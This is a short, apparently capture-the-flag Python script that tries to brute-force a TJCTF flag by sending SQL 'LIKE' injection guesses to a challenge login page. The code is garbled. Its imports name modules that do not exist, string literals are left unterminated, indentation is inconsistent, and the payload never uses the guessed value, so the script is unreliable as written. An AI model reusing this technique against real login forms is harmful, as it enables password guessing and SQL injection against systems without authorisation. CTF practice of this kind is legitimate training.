import request

from itertools import product 
import strings
chars = strings.letters + strings.digits + '
for length in range(1, 8): 
	to_attempt = product(chars, repeat=length) 
	for attempt in to_attempt: 
		brute = ''.join(attempt) 
                payload = 'password like tjctf{'.
                res = request.post('https://weak_password.tjctf.org/login', data = payload)
